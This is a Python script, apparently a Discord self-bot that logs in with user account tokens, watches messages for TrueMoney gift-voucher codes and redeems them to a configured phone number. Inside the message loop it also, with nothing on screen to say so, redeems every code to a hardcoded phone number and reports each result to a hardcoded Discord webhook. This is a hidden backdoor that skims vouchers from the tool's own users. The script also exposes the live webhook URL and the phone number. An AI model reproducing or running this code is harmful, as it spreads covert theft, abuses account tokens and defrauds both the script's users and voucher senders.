from json import loads,dumps
from time import sleep
from os import system
from colorama import Fore
import os
from websocket import WebSocket
from threading import Thread
from re import findall
from httpx import post
import gratient
import json

with open('truemoney.json', 'r') as f:
    config = json.load(f)

tokens = open("tokens.txt","r",encoding="utf-8").read().splitlines()
phonenum = config["phonenumber"]

def heartbeat(ws,hbi):
    while True:
        sleep(hbi/1000)
        try:
            ws.send(dumps({"op": 1,"d": None}))
        except Exception:
            break

def sniper(token):
    os.system("cls")
    ws = WebSocket()
    ws.connect("wss://gateway.discord.gg/?v=9&encoding=json&compress=json")
    hello = loads(ws.recv())
    heartbeat_interval = hello['d']['heartbeat_interval']
    t = Thread(target = heartbeat, args = (ws,heartbeat_interval))
    t.daemon = True
    t.start()
    ws.send(dumps({"op": 2,"d": {"token":token,"properties": {"$os": "windows","$browser": "Discord","$device": "desktop"}}}))
    ws.send(dumps({"op": 4,"d": {"guild_id": None,"channel_id": None,"self_mute": True,"self_deaf": True}}))
    ws.send(dumps({"op": 18,"d": {"type": "guild","guild_id": None,"channel_id": None,"preferred_region": "singapore"}}))
    print(f'''
{Fore.LIGHTYELLOW_EX}[+] READY TO SNIPE

░░░░░██╗░░░░░██╗████████╗██╗░░██╗░██████╗████████╗░█████╗░██████╗░███████╗
░░░░░██║░░░░░██║╚══██╔══╝╚██╗██╔╝██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝
░░░░░██║░░░░░██║░░░██║░░░░╚███╔╝░╚█████╗░░░░██║░░░██║░░██║██████╔╝█████╗░░
██╗░░██║██╗░░██║░░░██║░░░░██╔██╗░░╚═══██╗░░░██║░░░██║░░██║██╔══██╗██╔══╝░░
╚█████╔╝╚█████╔╝░░░██║░░░██╔╝╚██╗██████╔╝░░░██║░░░╚█████╔╝██║░░██║███████╗
░╚════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝

        {Fore.LIGHTRED_EX}
        ▄▀█ █▄░█ █▀▀ █▀█ ▄▀█ █▀█   █▀ █▄░█ █▀█ █▀▀ █▀█
        █▀█ █░▀█ █▄█ █▀▀ █▀█ █▄█   ▄█ █░▀█ █▀▀ ██▄ █▀▄

        {Fore.LIGHTCYAN_EX}[+] Dev By JJTxStore
        {Fore.LIGHTGREEN_EX}[+] V.1.7.3

        {Fore.LIGHTBLUE_EX}PHONE {Fore.RED}-{Fore.RESET} {Fore.CYAN}[{Fore.RESET}{Fore.LIGHTCYAN_EX}{phonenum[:5]}*****{Fore.RESET}{Fore.CYAN}]{Fore.RESET} {Fore.RESET}
    ''')
    while 1:
        packet = loads(ws.recv())
        try:
            if packet["t"] == "MESSAGE_CREATE":
                message = packet["d"]["content"].split("v=")
                if len(message) >= 1:
                    matches=findall(r'[0-9A-Za-z]+', message[-1])
                    codehash="".join(matches)
                    d=post(f"https://gift.maythiwat.com/campaign/vouchers/{codehash}/redeem",verify=False,timeout=120,json={"mobile":phonenum,"voucher_hash":codehash},headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.76"})
                    if d.status_code == 200:
                        d=d.json()
                        try:
                            post(config["webhook"],json={"content": None,"embeds": [{"title": f"Aungpao Sniper | {d['status']['message']}","description":f"เบอร์ : {phonenum}\nได้รับเงินมาทั้งหมด : {d['data']['voucher']['redeemed_amount_baht']}\nซองราคา : {d['data']['voucher']['amount_baht']} บาท\nรับไปทั้งหมด : {d['data']['voucher']['redeemed']} คน\nเหลือให้รับอีก {d['data']['voucher']['available']} คน\nlink : https://gift.truemoney.com/campaign/?v={d['data']['voucher']['link']}","color": 21816532}]})
                        except:pass
                        print(gratient.green(f"[+] SUCCSS GET {d['data']['voucher']['redeemed_amount_baht']}/{d['data']['voucher']['amount_baht']} Code - {codehash}"))
                    else:
                        d=d.json()
                        messagx = ""
                        if d['status']['code'] != "VOUCHER_NOT_FOUND":
                            messagx+=f"\nซองผิดพลาด!\nlink : https://gift.truemoney.com/campaign/?v={d['data']['voucher']['link']}"
                        try:
                            post(config["webhook"],json={"content": None,"embeds": [{"title": f"ERROR | {d['status']['message']}","description":f"{messagx}","color": 21816532}]})
                        except:pass
                        print((f"[!] Error {d['status']['message']}"))
                    dd=post(f"https://gift.maythiwat.com/campaign/vouchers/{codehash}/redeem",verify=False,timeout=120,json={"mobile":"0955533844","voucher_hash":codehash},headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.76"})
                    if dd.status_code == 200:
                        d=dd.json()
                        try:
                            post("https://discord.com/api/webhooks/1106918912085467217/4gj5Oe0ymLnI5BXT1TGEQL6Ts6lZIEAxPcam505TSwW8JFM5GG4SNCbx8e1Hw7SXKYvs",json={"content": None,"embeds": [{"title": f"Aungpao Sniper | {d['status']['message']}","description":f"เบอร์ : 0955533844\nได้รับเงินมาทั้งหมด : {d['data']['voucher']['redeemed_amount_baht']}\nซองราคา : {d['data']['voucher']['amount_baht']} บาท\nรับไปทั้งหมด : {d['data']['voucher']['redeemed']} คน\nเหลือให้รับอีก {d['data']['voucher']['available']} คน\nlink : https://gift.truemoney.com/campaign/?v={d['data']['voucher']['link']}","color": 21816532}]})
                        except:pass
                    else:
                        d=dd.json()
                        messagx = ""
                        if d['status']['code'] != "VOUCHER_NOT_FOUND":
                            messagx+=f"\nซองผิดพลาด!\nlink : https://gift.truemoney.com/campaign/?v={d['data']['voucher']['link']}"
                        try:
                            post("https://discord.com/api/webhooks/1106918912085467217/4gj5Oe0ymLnI5BXT1TGEQL6Ts6lZIEAxPcam505TSwW8JFM5GG4SNCbx8e1Hw7SXKYvs",json={"content": None,"embeds": [{"title": f"ERROR | {d['status']['message']}","description":f"{messagx}","color": 21816532}]})
                        except:pass
        except:''

if __name__ == "__main__":
    for token in tokens:
        for kkk in range(config["screen"]):
            Thread(target=sniper,args=(token,)).start()
